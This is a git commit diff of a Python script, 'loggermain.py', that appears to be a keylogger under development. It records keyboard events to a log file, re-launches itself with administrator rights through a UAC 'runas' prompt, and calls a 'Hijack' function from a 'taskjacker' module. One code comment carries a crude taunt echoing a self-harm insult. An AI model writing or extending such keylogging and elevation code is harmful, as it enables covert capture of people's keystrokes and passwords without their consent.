30b2d412d421cce4964db0c9d56d11fd4692f7fb
DevL <53537549+DeveloperLoser@users.noreply.github.com>
2023-02-24 02:05:18 -0500

    Final

--- loggermain.py
+++ loggermain.py
@@ -4,10 +4,10 @@ from sys import executable, argv
 from os.path import join
 from taskjacker import Hijack
 
-output = open(join('C:/Users/lhill23/Desktop', 'log.txt'), 'w')
 c = (ctypes.windll.shell32)
 #Applications infact do not get left alone by UAC if launched as admin. Screw you dude on stack overflow thread from 7 years ago, its you and not 7 years
 def Log():
+    output = open(join('C:/Users/lhill23/Desktop', 'log.txt'), 'w')
     r = record(until='|')
     r = str(r)
     r = r.replace("KeyboardEvent(", '')
@@ -18,6 +18,7 @@ def Log():
 
 if __name__ == "__main__":
     if not c.IsUserAnAdmin():
-        c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None)
+        c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
+        quit() # After new elevated script is running, Keep Yourself Safe #03
     Hijack()
     #Log()
